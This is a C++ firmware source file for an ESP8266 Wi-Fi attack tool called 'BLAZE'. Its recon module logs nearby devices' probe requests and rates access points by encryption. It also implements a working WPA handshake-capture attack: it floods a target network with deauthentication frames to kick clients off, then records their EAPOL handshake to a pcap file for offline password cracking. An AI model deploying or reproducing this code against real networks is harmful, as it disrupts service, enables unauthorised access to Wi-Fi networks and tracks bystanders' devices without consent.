/* BLAZE - Team DARK
   Recon module: EAPOL capture + probe log + vulnerability report
   See BlazeRecon.h for the safety rule (no flash IO in the RX callback). */

#include "BlazeRecon.h"

#include <LittleFS.h>

#include "Attack.h"
#include "Scan.h"
#include "BlazePersona.h"

extern Attack attack;
extern Scan   scan;

namespace BlazeRecon {
    // ===== pcap (DLT 105 = IEEE 802.11) =====
    const char* PCAP_PATH = "/eapol.pcap";

    static const uint8_t PCAP_GLOBAL[24] = {
        0xD4, 0xC3, 0xB2, 0xA1, // magic (little endian)
        0x02, 0x00, 0x04, 0x00, // v2.4
        0x00, 0x00, 0x00, 0x00, // thiszone
        0x00, 0x00, 0x00, 0x00, // sigfigs
        0xFF, 0xFF, 0x00, 0x00, // snaplen 65535
        0x69, 0x00, 0x00, 0x00  // linktype 105 (raw 802.11)
    };

    // EAPOL frames are small (4-way handshake: ~100-250 B each)
    #define EAPOL_MAX 8   // RAM queue slots
    #define EAPOL_LEN 400 // max stored frame size (bytes)

    static uint8_t  eqData[EAPOL_MAX][EAPOL_LEN];
    static uint16_t eqLen[EAPOL_MAX];
    static uint32_t eqSec[EAPOL_MAX];
    static uint32_t eqUsec[EAPOL_MAX];
    static uint8_t  eqHead = 0; // next write slot
    static uint8_t  eqCount = 0; // pending frames awaiting flash flush

    static uint8_t  capEapol = 0;  // frames this session
    static uint8_t  capDrop  = 0;  // frames dropped (queue full / too big)
    static uint32_t eapolAll = 0;  // frames all sessions this boot

    // ===== capture phase machine (4.4) =====
    enum : uint8_t { CAP_OFF = 0, CAP_KICK = 1, CAP_REC = 2 };

    static uint8_t  capPhase = CAP_OFF;
    static int      capAp    = -1;
    static uint8_t  capCh    = 1;
    static uint32_t capStart = 0;
    static uint32_t capKick  = 0;

    // ===== probe ring (4.5) =====
    #define PROBE_MAX 32

    struct ProbeEntry {
        uint32_t t;
        uint8_t  mac[6];
        uint16_t hits; // probe-request count for this MAC+SSID (saturated)
        uint8_t  ch;
        int8_t   rssi;
        char     ssid[33];
    };

    static ProbeEntry probe[PROBE_MAX];
    static uint8_t    probeN    = 0; // entries used
    static uint8_t    probeNext = 0; // slot to overwrite when full
    static uint32_t   probeAll  = 0; // total probe requests this boot

    // ================= helpers ================= //

    // severity of one AP's encryption (weakest-link model for the score)
    static int encSeverity(uint8_t enc) {
        switch (enc) {
            case ENC_TYPE_NONE: return 90; // open    -> CRITICAL
            case ENC_TYPE_WEP:  return 90; // broken  -> CRITICAL
            case ENC_TYPE_TKIP: return 65; // weak    -> HIGH
            case ENC_TYPE_AUTO: return 40; // may fall back to TKIP -> MEDIUM
            case ENC_TYPE_CCMP: return 10; // WPA2-AES -> PASS
            default:            return 25; // unknown -> moderate
        }
    }

    static const char* encLevel(uint8_t enc) {
        switch (enc) {
            case ENC_TYPE_NONE: return "CRITICAL";
            case ENC_TYPE_WEP:  return "CRITICAL";
            case ENC_TYPE_TKIP: return "HIGH";
            case ENC_TYPE_AUTO: return "MEDIUM";
            case ENC_TYPE_CCMP: return "PASS";
            default:            return "UNKNOWN";
        }
    }

    // queue one EAPOL frame (RAM only - called from RX context)
    static void pushEapol(const uint8_t* frame, uint16_t flen) {
        if (flen > EAPOL_LEN) { capDrop++; return; }
        if (eqCount >= EAPOL_MAX) { capDrop++; return; }

        uint8_t slot = (uint8_t)((eqHead + eqCount) % EAPOL_MAX);
        memcpy(eqData[slot], frame, flen);
        eqLen[slot]  = flen;
        uint32_t ms  = millis();
        eqSec[slot]  = ms / 1000;        // uptime-based timestamp (valid pcap)
        eqUsec[slot] = (ms % 1000) * 1000;

        eqCount++;
        capEapol++;
        eapolAll++;
    }

    // write queued frames to flash - MAIN LOOP ONLY
    static void flushEapol() {
        if (eqCount == 0) return;

        File f = LittleFS.open(PCAP_PATH, "a");
        if (!f) {
            prntln("[BLAZE] pcap open failed - dropping queued frames");
            eqCount = 0;
            return;
        }

        if (f.size() == 0) f.write(PCAP_GLOBAL, sizeof(PCAP_GLOBAL));

        while (eqCount > 0) {
            uint8_t  idx  = (uint8_t)((eqHead + EAPOL_MAX - eqCount) % EAPOL_MAX);
            uint32_t hdr[4] = { eqSec[idx], eqUsec[idx], eqLen[idx], eqLen[idx] };
            f.write((uint8_t*)hdr, 16);
            f.write(eqData[idx], eqLen[idx]);
            eqCount--;
        }
        f.close();
    }

    // parse a probe request (RX context: char buffers only, no String)
    static void logProbe(uint8_t* buf, uint16_t len) {
        probeAll++;
        if (len < 38) return; // need addr2 (buf 22..27) + at least one IE

        uint8_t* mac = &buf[22];

        // tagged params start at frame offset 24 -> buf offset 36
        char   ssid[33];
        uint8_t ssidLen = 0;
        uint16_t idx    = 36;

        memset(ssid, 0, sizeof(ssid));

        while (idx + 1 < len) {
            uint8_t tag  = buf[idx];
            uint8_t tlen = buf[idx + 1];
            if ((uint16_t)(idx + 2 + tlen) > len) break;

            if (tag == 0) { // SSID
                ssidLen = (tlen > 32) ? 32 : tlen;
                memcpy(ssid, &buf[idx + 2], ssidLen);
                ssid[ssidLen] = 0;
                break;
            }
            idx = (uint16_t)(idx + 2 + tlen);
        }

        // sanitize control characters (keep UTF-8 bytes >= 0x20)
        for (uint8_t i = 0; i < ssidLen; i++)
            if ((uint8_t)ssid[i] < 0x20) ssid[i] = '.';

        int8_t  rssi = (int8_t)buf[0]; // RxControl first byte = RSSI (dBm)
        uint8_t ch   = wifi_channel;

        // dedup: same MAC + SSID -> update signal, else insert
        int slot = -1;
        for (int i = 0; i < probeN; i++) {
            if (memcmp(probe[i].mac, mac, 6) == 0 && strcmp(probe[i].ssid, ssid) == 0) {
                slot = i;
                break;
            }
        }

        if (slot >= 0) {
            probe[slot].rssi = rssi;
            probe[slot].ch   = ch;
            probe[slot].t    = millis();
            if (probe[slot].hits < 65535) probe[slot].hits++;
            return;
        }

        if (probeN < PROBE_MAX) {
            slot = probeN;
            probeN++;
        } else {
            slot = probeNext; // ring full: overwrite oldest
        }
        probeNext = (uint8_t)((slot + 1) % PROBE_MAX);

        memcpy(probe[slot].mac, mac, 6);
        memcpy(probe[slot].ssid, ssid, 33);
        probe[slot].ch   = ch;
        probe[slot].rssi = rssi;
        probe[slot].t    = millis();
        probe[slot].hits = 1;
    }

    // find LLC/SNAP + EAPOL ethertype in a sniffer buffer
    static void checkEapol(uint8_t* buf, uint16_t len) {
        // candidate LLC offsets: 3-addr(24), QoS(+2), WDS(+6), WDS+QoS(+8)
        static const uint8_t cand[4] = { 36, 38, 42, 46 };

        for (uint8_t c = 0; c < 4; c++) {
            if (len < (uint16_t)(cand[c] + 8)) continue;
            uint8_t o = cand[c];
            if (buf[o] == 0xAA && buf[o + 1] == 0xAA && buf[o + 2] == 0x03 &&
                buf[o + 6] == 0x88 && buf[o + 7] == 0x8E) {
                pushEapol(&buf[12], (uint16_t)(len - 12)); // 802.11 frame only
                return;
            }
        }
    }

    static void finishCapture() {
        if (scan.isSniffing()) scan.stop();
        flushEapol();
        capPhase = CAP_OFF;

        prnt("[BLAZE] EAPOL capture done: ");
        prnt(capEapol);
        prnt(" frame(s), ");
        prnt(capDrop);
        prnt(" dropped -> ");
        prntln(PCAP_PATH);
    }

    // ================= public API ================= //

    void setup() {
        capPhase = CAP_OFF;
        eqCount  = 0;
        eqHead   = 0;
    }

    void update() {
        flushEapol(); // main-loop flash writes (never in RX context)

        // persona: handshake frames arriving -> LOCKED (main loop only,
        // the actual capEapol++ runs in RX context and must not allocate)
        static uint8_t lastCap = 0;
        if (capEapol > lastCap) BlazePersona::onEvent(BlazePersona::EV_EAPOL);
        lastCap = capEapol;

        if (capPhase == CAP_OFF) return;

        uint32_t now = millis();

        if (capPhase == CAP_KICK) {
            // 10 Hz direct deauth: kick clients so they re-handshake
            if (now - capKick >= 100) {
                capKick = now;
                attack.deauthAP(capAp);
            }
            if (now - capStart >= 4000) {
                // 4 s done -> record phase: fixed-channel sniffer, max 45 s
                scan.start(SCAN_MODE_SNIFFER, 45000, SCAN_MODE_OFF, 0, false, capCh);
                capPhase = CAP_REC;
                capStart = now;
                prnt("[BLAZE] EAPOL capture: RECORD on ch ");
                prntln(capCh);
            }
            return;
        }

        // CAP_REC: stop on a full handshake or timeout
        if (capEapol >= 4 || (now - capStart >= 45000)) finishCapture();
    }

    void sniff(uint8_t* buf, uint16_t len) {
        if (len < 14) return;

        uint8_t fc = buf[12];

        if ((fc & 0xFC) == 0x40) { // probe request (type mgmt, subtype 4)
            logProbe(buf, len);
            return;
        }

        if (capPhase != CAP_REC) return; // EAPOL only matters while recording
        if ((fc & 0x0C) != 0x08) return; // data frames only

        checkEapol(buf, len);
    }

    bool startCapture(int apIdx) {
        if (capPhase != CAP_OFF) return false;
        if (apIdx < 0 || apIdx >= accesspoints.count()) return false;

        // no channel fights: stop any running attack + scans first
        if (attack.isRunning()) attack.stop();
        if (scan.isScanning()) scan.stop();

        uint8_t ch = accesspoints.getCh(apIdx);
        if (ch < 1 || ch > 14) ch = 1;

        capAp    = apIdx;
        capCh    = ch;
        capPhase = CAP_KICK;
        capStart = millis();
        capKick  = 0;
        capEapol = 0;
        capDrop  = 0;

        prntln("[BLAZE] EAPOL capture: KICK phase (4 s)");
        return true;
    }

    void stopCapture() {
        if (capPhase == CAP_OFF) return;

        if (capPhase == CAP_REC && scan.isSniffing()) scan.stop();
        flushEapol();
        capPhase = CAP_OFF;
        prntln("[BLAZE] EAPOL capture stopped");
    }

    bool capturing()    { return capPhase != CAP_OFF; }
    uint8_t capturePhase() { return capPhase; }
    uint8_t eapolFrames()  { return capEapol; }
    uint32_t eapolTotal()  { return eapolAll; }
    String pcapPath()      { return String(PCAP_PATH); }

    int probeCount()    { return probeN; }
    uint32_t probeTotal() { return probeAll; }

    String probeLine(int i) {
        if (i < 0 || i >= probeN) return String();

        int idx = (probeNext + PROBE_MAX - 1 - i) % PROBE_MAX; // i = 0 -> newest

        char m[9];
        sprintf(m, "%02X:%02X:%02X", probe[idx].mac[3], probe[idx].mac[4], probe[idx].mac[5]);

        String s = String(m);
        s += " ";
        String ssid = String(probe[idx].ssid);
        if (ssid.length() == 0) ssid = "<hidden>";
        s += ssid;
        s += " ";
        s += String(probe[idx].rssi);
        return s;
    }

    bool probeGet(int i, ProbeInfo& out) {
        if (i < 0 || i >= probeN) return false;

        int idx = (probeNext + PROBE_MAX - 1 - i) % PROBE_MAX; // i = 0 -> newest
        memcpy(out.mac, probe[idx].mac, 6);
        memcpy(out.ssid, probe[idx].ssid, 33);
        out.ch   = probe[idx].ch;
        out.rssi = probe[idx].rssi;
        out.t    = probe[idx].t;
        out.hits = probe[idx].hits;
        return true;
    }

    void clearProbes() {
        probeN    = 0;
        probeNext = 0;
        probeAll  = 0;
    }

    int riskScore() {
        int worst = -1;
        int n     = accesspoints.count();
        for (int i = 0; i < n; i++) {
            int sev = encSeverity(accesspoints.getEnc(i));
            if (sev > worst) worst = sev;
        }
        return worst < 0 ? 0 : worst;
    }

    const char* riskLevel() {
        if (accesspoints.count() == 0) return "NO DATA";
        int s = riskScore();
        if (s >= 80) return "CRITICAL";
        if (s >= 55) return "HIGH";
        if (s >= 30) return "MEDIUM";
        return "LOW";
    }

    int worstAp() {
        int worst = -1, worstSev = -1;
        int n = accesspoints.count();
        for (int i = 0; i < n; i++) {
            int sev = encSeverity(accesspoints.getEnc(i));
            if (sev > worstSev) {
                worstSev = sev;
                worst    = i;
            }
        }
        return worst;
    }

    String reportJson() {
        String j = "{\"generated\":";
        j += millis();
        j += ",\"score\":";
        j += riskScore();
        j += ",\"level\":\"";
        j += riskLevel();
        j += "\",\"ap_count\":";
        j += accesspoints.count();
        j += ",\"eapol_frames\":";
        j += eapolAll;
        j += ",\"probe_requests\":";
        j += probeAll;
        j += ",\"aps\":[";

        int n = accesspoints.count();
        for (int i = 0; i < n; i++) {
            if (i) j += ",";
            j += "{\"ssid\":\"" + escape(accesspoints.getSSID(i)) + "\"";
            j += ",\"mac\":\"" + accesspoints.getMacStr(i) + "\"";
            j += ",\"ch\":" + String(accesspoints.getCh(i));
            j += ",\"enc\":\"" + accesspoints.getEncStr(i) + "\"";
            j += ",\"level\":\"" + String(encLevel(accesspoints.getEnc(i))) + "\"";
            j += "}";
        }
        j += "]}";
        return j;
    }

    String reportCsv() {
        String c = "ssid,ch,enc,level\n";
        int    n = accesspoints.count();
        for (int i = 0; i < n; i++) {
            String ssid = accesspoints.getSSID(i);
            ssid.replace("\"", "'"); // keep CSV single-line safe
            c += "\"" + ssid + "\"," + String(accesspoints.getCh(i)) + "," +
                 accesspoints.getEncStr(i) + "," + String(encLevel(accesspoints.getEnc(i))) + "\n";
        }
        return c;
    }
}
